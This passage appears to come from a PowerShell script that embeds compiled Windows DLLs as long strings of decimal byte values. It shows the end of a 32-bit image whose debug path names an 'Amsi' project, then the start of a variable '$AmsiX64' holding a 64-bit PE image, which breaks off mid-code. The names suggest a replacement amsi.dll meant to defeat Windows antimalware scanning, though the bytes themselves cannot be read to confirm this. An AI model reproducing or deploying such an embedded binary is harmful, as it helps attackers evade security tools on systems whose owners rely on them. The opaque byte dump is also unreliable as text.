224 16 11 200 137 13 4 48 0 16 247 209 137 13 0 48 0 16 95 94 139 229 93 195 104 96 51 0 16 255 21 24 32 0 16 195 104 96 51 0 16 232 229 3 0 0 89 195 184 104 51 0 16 195 184 112 51 0 16 195 232 239 255 255 255 139 72 4 131 8 4 137 72 4 232 231 255 255 255 139 72 4 131 8 2 137 72 4 195 184 132 51 0 16 195 85 139 236 129 236 36 3 0 0 83 86 106 23 232 234 3 0 0 133 192 116 5 139 77 8 205 41 51 246 141 133 220 252 255 255 104 204 2 0 0 86 80 137 53 120 51 0 16 232 133 3 0 0 131 196 12 137 133 140 253 255 255 137 141 136 253 255 255 137 149 132 253 255 255 137 157 128 253 255 255 137 181 124 253 255 255 137 189 120 253 255 255 102 140 149 164 253 255 255 102 140 141 152 253 255 255 102 140 157 116 253 255 255 102 140 133 112 253 255 255 102 140 165 108 253 255 255 102 140 173 104 253 255 255 156 143 133 156 253 255 255 139 69 4 137 133 148 253 255 255 141 69 4 137 133 160 253 255 255 199 133 220 252 255 255 1 0 1 0 139 64 252 106 80 137 133 144 253 255 255 141 69 168 86 80 232 252 2 0 0 139 69 4 131 196 12 199 69 168 21 0 0 64 199 69 172 1 0 0 0 137 69 180 255 21 20 32 0 16 86 141 88 255 247 219 141 69 168 137 69 248 141 133 220 252 255 255 26 219 137 69 252 254 195 255 21 40 32 0 16 141 69 248 80 255 21 0 32 0 16 133 192 117 13 15 182 195 247 216 27 192 33 5 120 51 0 16 94 91 139 229 93 195 83 86 190 8 36 0 16 187 8 36 0 16 59 243 115 24 87 139 62 133 255 116 9 139 207 232 56 0 0 0 255 215 131 198 4 59 243 114 234 95 94 91 195 83 86 190 16 36 0 16 187 16 36 0 16 59 243 115 24 87 139 62 133 255 116 9 139 207 232 13 0 0 0 255 215 131 198 4 59 243 114 234 95 94 91 195 255 37 112 32 0 16 204 204 204 204 204 104 75 26 0 16 100 255 53 0 0 0 0 139 68 36 16 137 108 36 16 141 108 36 16 43 224 83 86 87 161 4 48 0 16 49 69 252 51 197 80 137 101 232 255 117 248 139 69 252 199 69 252 254 255 255 255 137 69 248 141 69 240 100 163 0 0 0 0 242 195 139 77 240 100 137 13 0 0 0 0 89 95 95 94 91 139 229 93 81 242 195 85 139 236 255 117 20 255 117 16 255 117 12 255 117 8 104 5 16 0 16 104 4 48 0 16 232 203 1 0 0 131 196 24 93 195 85 139 236 131 37 124 51 0 16 0 131 236 44 83 51 219 67 9 29 16 48 0 16 106 10 232 228 1 0 0 133 192 15 132 116 1 0 0 131 101 236 0 51 192 131 13 16 48 0 16 2 51 201 86 87 137 29 124 51 0 16 141 125 212 83 15 162 139 243 91 137 7 137 119 4 137 79 8 137 87 12 139 69 212 139 77 224 137 69 244 129 241 105 110 101 73 139 69 220 53 110 116 101 108 11 200 139 69 216 53 71 101 110 117 11 200 247 217 106 1 88 26 201 106 0 128 193 1 89 83 15 162 139 243 91 137 7 137 119 4 137 79 8 137 87 12 116 67 139 69 212 37 240 63 255 15 61 192 6 1 0 116 35 61 96 6 2 0 116 28 61 112 6 2 0 116 21 61 80 6 3 0 116 14 61 96 6 3 0 116 7 61 112 6 3 0 117 17 139 61 128 51 0 16 131 207 1 137 61 128 51 0 16 235 6 139 61 128 51 0 16 131 125 244 7 139 69 224 137 69 228 139 69 220 137 69 248 137 69 232 124 50 106 7 88 51 201 83 15 162 139 243 91 141 93 212 137 3 137 115 4 137 75 8 137 83 12 139 69 216 169 0 2 0 0 137 69 236 139 69 248 116 9 131 207 2 137 61 128 51 0 16 95 94 169 0 0 16 0 116 109 131 13 16 48 0 16 4 199 5 124 51 0 16 2 0 0 0 169 0 0 0 8 116 85 169 0 0 0 16 116 78 51 201 15 1 208 137 69 240 137 85 244 139 69 240 139 77 244 131 224 6 51 201 131 248 6 117 51 133 201 117 47 161 16 48 0 16 131 200 8 199 5 124 51 0 16 3 0 0 0 246 69 236 32 163 16 48 0 16 116 18 131 200 32 199 5 124 51 0 16 5 0 0 0 163 16 48 0 16 51 192 91 139 229 93 195 51 192 57 5 20 48 0 16 15 149 192 195 195 255 37 52 32 0 16 255 37 60 32 0 16 255 37 56 32 0 16 255 37 48 32 0 16 255 37 64 32 0 16 255 37 104 32 0 16 255 37 100 32 0 16 255 37 96 32 0 16 255 37 92 32 0 16 255 37 88 32 0 16 255 37 84 32 0 16 255 37 80 32 0 16 255 37 76 32 0 16 255 37 72 32 0 16 255 37 12 32 0 16 176 1 195 51 192 195 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 198 38 0 0 0 39 0 0 20 39 0 0 40 39 0 0 68 39 0 0 186 39 0 0 164 39 0 0 138 39 0 0 116 39 0 0 94 39 0 0 226 38 0 0 0 0 0 0 184 37 0 0 84 37 0 0 152 37 0 0 118 37 0 0 194 37 0 0 0 0 0 0 154 38 0 0 140 38 0 0 116 38 0 0 88 38 0 0 60 38 0 0 26 38 0 0 8 38 0 0 250 37 0 0 238 37 0 0 0 0 0 0 27 28 0 16 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 48 0 16 112 48 0 16 0 0 0 0 0 0 0 0 144 29 62 87 0 0 0 0 2 0 0 0 61 0 0 0 132 33 0 0 132 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 12 0 0 0 20 0 0 0 196 33 0 0 196 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 13 0 0 0 44 2 0 0 216 33 0 0 216 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 14 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 92 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 4 48 0 16 128 33 0 16 1 0 0 0 112 32 0 16 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 75 26 0 0 82 83 68 83 69 10 117 219 0 114 41 77 133 149 98 78 29 103 122 248 7 0 0 0 67 58 92 68 101 118 101 108 111 112 109 101 110 116 92 65 109 115 105 92 82 101 108 101 97 115 101 92 65 109 115 105 46 112 100 98 0 0 0 0 0 0 0 0 20 0 0 0 20 0 0 0 1 0 0 0 19 0 0 0 71 67 84 76 0 16 0 0 124 12 0 0 46 116 101 120 116 36 109 110 0 0 0 0 0 32 0 0 112 0 0 0 46 105 100 97 116 97 36 53 0 0 0 0 112 32 0 0 4 0 0 0 46 48 48 99 102 103 0 0 116 32 0 0 4 0 0 0 46 67 82 84 36 88 67 65 0 0 0 0 120 32 0 0 4 0 0 0 46 67 82 84 36 88 67 90 0 0 0 0 124 32 0 0 4 0 0 0 46 67 82 84 36 88 73 65 0 0 0 0 128 32 0 0 4 0 0 0 46 67 82 84 36 88 73 90 0 0 0 0 132 32 0 0 4 0 0 0 46 67 82 84 36 88 80 65 0 0 0 0 136 32 0 0 4 0 0 0 46 67 82 84 36 88 80 90 0 0 0 0 140 32 0 0 4 0 0 0 46 67 82 84 36 88 84 65 0 0 0 0 144 32 0 0 4 0 0 0 46 67 82 84 36 88 84 90 0 0 0 0 160 32 0 0 220 0 0 0 46 114 100 97 116 97 0 0 128 33 0 0 4 0 0 0 46 114 100 97 116 97 36 115 120 100 97 116 97 0 0 0 132 33 0 0 128 2 0 0 46 114 100 97 116 97 36 122 122 122 100 98 103 0 0 0 4 36 0 0 4 0 0 0 46 114 116 99 36 73 65 65 0 0 0 0 8 36 0 0 4 0 0 0 46 114 116 99 36 73 90 90 0 0 0 0 12 36 0 0 4 0 0 0 46 114 116 99 36 84 65 65 0 0 0 0 16 36 0 0 4 0 0 0 46 114 116 99 36 84 90 90 0 0 0 0 24 36 0 0 124 0 0 0 46 120 100 97 116 97 36 120 0 0 0 0 148 36 0 0 60 0 0 0 46 105 100 97 116 97 36 50 0 0 0 0 208 36 0 0 20 0 0 0 46 105 100 97 116 97 36 51 0 0 0 0 228 36 0 0 112 0 0 0 46 105 100 97 116 97 36 52 0 0 0 0 84 37 0 0 136 2 0 0 46 105 100 97 116 97 36 54 0 0 0 0 0 48 0 0 24 0 0 0 46 100 97 116 97 0 0 0 24 48 0 0 112 3 0 0 46 98 115 115 0 0 0 0 0 64 0 0 20 0 0 0 46 103 102 105 100 115 36 121 0 0 0 0 0 80 0 0 88 0 0 0 46 114 115 114 99 36 48 49 0 0 0 0 96 80 0 0 128 1 0 0 46 114 115 114 99 36 48 50 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 254 255 255 255 0 0 0 0 208 255 255 255 0 0 0 0 254 255 255 255 0 0 0 0 110 17 0 16 0 0 0 0 254 255 255 255 0 0 0 0 212 255 255 255 0 0 0 0 254 255 255 255 0 0 0 0 233 17 0 16 0 0 0 0 254 255 255 255 0 0 0 0 212 255 255 255 0 0 0 0 254 255 255 255 203 18 0 16 234 18 0 16 0 0 0 0 254 255 255 255 0 0 0 0 216 255 255 255 0 0 0 0 254 255 255 255 215 22 0 16 234 22 0 16 20 37 0 0 0 0 0 0 0 0 0 0 220 37 0 0 48 32 0 0 44 37 0 0 0 0 0 0 0 0 0 0 164 38 0 0 72 32 0 0 228 36 0 0 0 0 0 0 0 0 0 0 206 39 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 198 38 0 0 0 39 0 0 20 39 0 0 40 39 0 0 68 39 0 0 186 39 0 0 164 39 0 0 138 39 0 0 116 39 0 0 94 39 0 0 226 38 0 0 0 0 0 0 184 37 0 0 84 37 0 0 152 37 0 0 118 37 0 0 194 37 0 0 0 0 0 0 154 38 0 0 140 38 0 0 116 38 0 0 88 38 0 0 60 38 0 0 26 38 0 0 8 38 0 0 250 37 0 0 238 37 0 0 0 0 0 0 40 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 105 110 118 111 107 101 95 116 114 105 103 103 101 114 0 41 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 114 101 116 117 114 110 95 116 114 105 103 103 101 114 0 37 0 95 95 115 116 100 95 116 121 112 101 95 105 110 102 111 95 100 101 115 116 114 111 121 95 108 105 115 116 0 0 72 0 109 101 109 115 101 116 0 0 53 0 95 101 120 99 101 112 116 95 104 97 110 100 108 101 114 52 95 99 111 109 109 111 110 0 86 67 82 85 78 84 73 77 69 49 52 48 46 100 108 108 0 0 56 0 95 105 110 105 116 116 101 114 109 0 57 0 95 105 110 105 116 116 101 114 109 95 101 0 65 0 95 115 101 104 95 102 105 108 116 101 114 95 100 108 108 0 53 0 95 105 110 105 116 105 97 108 105 122 101 95 110 97 114 114 111 119 95 101 110 118 105 114 111 110 109 101 110 116 0 0 54 0 95 105 110 105 116 105 97 108 105 122 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 0 62 0 95 114 101 103 105 115 116 101 114 95 111 110 101 120 105 116 95 102 117 110 99 116 105 111 110 0 36 0 95 101 120 101 99 117 116 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 31 0 95 99 114 116 95 97 116 101 120 105 116 0 23 0 95 99 101 120 105 116 0 0 97 112 105 45 109 115 45 119 105 110 45 99 114 116 45 114 117 110 116 105 109 101 45 108 49 45 49 45 48 46 100 108 108 0 130 5 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 0 67 5 83 101 116 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 9 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 0 97 5 84 101 114 109 105 110 97 116 101 80 114 111 99 101 115 115 0 0 109 3 73 115 80 114 111 99 101 115 115 111 114 70 101 97 116 117 114 101 80 114 101 115 101 110 116 0 45 4 81 117 101 114 121 80 101 114 102 111 114 109 97 110 99 101 67 111 117 110 116 101 114 0 10 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 73 100 0 14 2 71 101 116 67 117 114 114 101 110 116 84 104 114 101 97 100 73 100 0 0 214 2 71 101 116 83 121 115 116 101 109 84 105 109 101 65 115 70 105 108 101 84 105 109 101 0 75 3 73 110 105 116 105 97 108 105 122 101 83 76 105 115 116 72 101 97 100 0 103 3 73 115 68 101 98 117 103 103 101 114 80 114 101 115 101 110 116 0 75 69 82 78 69 76 51 50 46 100 108 108 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 177 25 191 68 78 230 64 187 255 255 255 255 0 0 0 0 1 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 54 0 0 0 73 0 0 0 76 0 0 0 12 0 0 0 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 24 0 0 0 24 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 2 0 0 0 48 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 9 4 0 0 72 0 0 0 96 80 0 0 125 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 60 63 120 109 108 32 118 101 114 115 105 111 110 61 39 49 46 48 39 32 101 110 99 111 100 105 110 103 61 39 85 84 70 45 56 39 32 115 116 97 110 100 97 108 111 110 101 61 39 121 101 115 39 63 62 13 10 60 97 115 115 101 109 98 108 121 32 120 109 108 110 115 61 39 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 49 39 32 109 97 110 105 102 101 115 116 86 101 114 115 105 111 110 61 39 49 46 48 39 62 13 10 32 32 60 116 114 117 115 116 73 110 102 111 32 120 109 108 110 115 61 34 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 51 34 62 13 10 32 32 32 32 60 115 101 99 117 114 105 116 121 62 13 10 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 69 120 101 99 117 116 105 111 110 76 101 118 101 108 32 108 101 118 101 108 61 39 97 115 73 110 118 111 107 101 114 39 32 117 105 65 99 99 101 115 115 61 39 102 97 108 115 101 39 32 47 62 13 10 32 32 32 32 32 32 60 47 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 60 47 115 101 99 117 114 105 116 121 62 13 10 32 32 60 47 116 114 117 115 116 73 110 102 111 62 13 10 60 47 97 115 115 101 109 98 108 121 62 13 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 16 0 0 12 1 0 0 7 48 108 48 155 48 171 48 194 48 211 48 228 48 233 48 2 49 7 49 20 49 97 49 126 49 136 49 150 49 168 49 189 49 251 49 212 50 7 51 85 51 94 51 105 51 112 51 144 51 150 51 156 51 162 51 168 51 174 51 181 51 188 51 195 51 202 51 209 51 216 51 223 51 231 51 239 51 247 51 3 52 12 52 17 52 23 52 33 52 43 52 59 52 75 52 91 52 100 52 201 52 121 53 170 53 249 53 12 54 31 54 43 54 59 54 76 54 114 54 135 54 142 54 148 54 166 54 176 54 17 55 30 55 69 55 77 55 102 55 160 55 187 55 199 55 214 55 223 55 236 55 27 56 35 56 46 56 52 56 58 56 70 56 76 56 111 56 160 56 75 57 106 57 116 57 133 57 146 57 151 57 189 57 194 57 231 57 241 57 14 58 91 58 96 58 115 58 129 58 156 58 167 58 54 59 63 59 71 59 142 59 157 59 164 59 218 59 227 59 240 59 251 59 4 60 19 60 30 60 36 60 42 60 48 60 54 60 60 60 66 60 72 60 78 60 84 60 90 60 96 60 102 60 108 60 114 60 0 0 0 32 0 0 32 0 0 0 112 48 164 48 168 48 92 49 96 49 104 49 48 52 80 52 108 52 112 52 140 52 144 52 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\" $AmsiX64 = \"77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 148 172 98 253 208 205 12 174 208 205 12 174 208 205 12 174 217 181 159 174 210 205 12 174 190 150 13 175 211 205 12 174 190 150 15 175 210 205 12 174 190 150 9 175 216 205 12 174 190 150 8 175 217 205 12 174 13 50 199 174 210 205 12 174 208 205 13 174 240 205 12 174 2 150 4 175 209 205 12 174 2 150 243 174 209 205 12 174 2 150 14 175 209 205 12 174 82 105 99 104 208 205 12 174 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 69 0 0 100 134 7 0 136 29 62 87 0 0 0 0 0 0 0 0 240 0 34 32 11 2 14 0 0 16 0 0 0 28 0 0 0 0 0 0 160 19 0 0 0 16 0 0 0 0 0 128 1 0 0 0 0 16 0 0 0 2 0 0 6 0 0 0 0 0 0 0 6 0 0 0 0 0 0 0 0 128 0 0 0 4 0 0 0 0 0 0 2 0 96 1 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 108 38 0 0 80 0 0 0 0 96 0 0 224 1 0 0 0 64 0 0 176 1 0 0 0 0 0 0 0 0 0 0 0 112 0 0 24 0 0 0 112 33 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 224 33 0 0 148 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 248 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 46 116 101 120 116 0 0 0 211 14 0 0 0 16 0 0 0 16 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 96 46 114 100 97 116 97 0 0 128 10 0 0 0 32 0 0 0 12 0 0 0 20 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 100 97 116 97 0 0 0 64 6 0 0 0 48 0 0 0 2 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 192 46 112 100 97 116 97 0 0 176 1 0 0 0 64 0 0 0 2 0 0 0 34 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 103 102 105 100 115 0 0 16 0 0 0 0 80 0 0 0 2 0 0 0 36 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 115 114 99 0 0 0 224 1 0 0 0 96 0 0 0 2 0 0 0 38 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 101 108 111 99 0 0 24 0 0 0 0 112 0 0 0 2 0 0 0 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 66 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 51 192 195 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 102 102 15 31 132 0 0 0 0 0 72 59 13 217 31 0 0 242 117 18 72 193 193 16 102 247 193 255 255 242 117 2 242 195 72 193 201 16 233 211 3 0 0 204 204 204 72 131 236 40 133 210 116 57 131 234 1 116 40 131 234 1 116 22 131 250 1 116 10 184 1 0 0 0 72 131 196 40 195 232 142 5 0 0 235 5 232 95 5 0 0 15 182 192 72 131 196 40 195 73 139 208 72 131 196 40 233 15 0 0 0 77 133 192 15 149 193 72 131 196 40 233 44 1 0 0 72 137 92 36 8 72 137 116 36 16 72 137 124 36 32 65 86 72 131 236 32 72 139 242 76 139 241 51 201 232 2 6 0 0 132 192 117 7 51 192 233 232 0 0 0 232 150 4 0 0 138 216 136 68 36 64 64 183 1 131 61 234 36 0 0 0 116 10 185 7 0 0 0 232 62 9 0 0 199 5 212 36 0 0 1 0 0 0 232 199 4 0 0 132 192 116 103 232 110 10 0 0 72 141 13 179 10 0 0 232 6 8 0 0 232 197 8 0 0 72 141 13 206 8 0 0 232 245 7 0 0 232 224 8 0 0 72 141 21 253 15 0 0 72 141 13 238 15 0 0 232 213 12 0 0 133 192 117 41 232 96 4 0 0 132 192 116 32 72 141 21 205 15 0 0 72 141 13 190 15 0 0 232 175 12 0 0 199 5 103 36 0 0 2 0 0 0 64 50 255 138 203 232 9 7 0 0 64 132 255 15 133 78 255 255 255 232 167 8 0 0 72 139 216 72 131 56 0 116 36 72 139 200 232 78 6 0 0 132 192 116 24 72 139 27 72 139 203 232 111 10 0 0 76 139 198 186 2 0 0 0 73 139 206 255 211 255 5 156 30 0 0 184 1 0 0 0 72 139 92 36 48 72 139 116 36 56 72 139 124 36 72 72 131 196 32 65 94 195 204 72 137 92 36 8 72 137 116 36 24 87 72 131 236 32 64 138 241 139 5 104 30 0 0 51 219 133 192 127 4 51 192 235 80 255 200 137 5 86 30 0 0 232 109 3 0 0 64 138 248 136 68 36 56 131 61 195 35 0 0 2 116 10 185 7 0 0 0 232 23 8 0 0 232 102 4 0 0 137 29 172 35 0 0 232 139 4 0 0 64 138 207 232 75 6 0 0 51 210 64 138 206 232 101 6 0 0 132 192 15 149 195 139 195 72 139 92 36 48 72 139 116 36 64 72 131 196 32 95 195 204 204 72 139 196 72 137 88 32 76 137 64 24 137 80 16 72 137 72 8 86 87 65 86 72 131 236 64 77 139 240 139 250 72 139 241 141 66 255 131 248 1 119 46 232 217 0 0 0 139 216 137 68 36 48 133 192 15 132 179 0 0 0 77 139 198 139 215 72 139 206 232 182 253 255 255 139 216 137 68 36 48 133 192 15 132 152 0 0 0 131 255 1 117 8 72 139 206 232 55 11 0 0 77 139 198 139 215 72 139 206 232 74 253 255 255 139 216 137 68 36 48 131 255 1 117 52 133 192 117 39 77 139 198 51 210 72 139 206 232 46 253 255 255 77 139 198 51 210 72 139 206 232 101 253 255 255 77 139 198 51 210 72 139 206 232 96 0 0 0 131 255 1 117 4 133 219 116 4 133 255 117 12 72 139 206 232 229 10 0 0 133 255 116 5 131 255 3 117 42 77 139 198 139 215 72 139 206 232 45 253 255 255 139 216 137 68 36 48 133 192 116 19 77 139 198 139 215 72 139 206 232 30 0 0 0 139 216 137 68 36 48 235 6 51 219 137 92 36 48 139 195 72 139 92 36 120 72 131 196 64 65 94 95 94 195 72 137 92 36 8 72 137 108 36 16 72 137 116 36 24 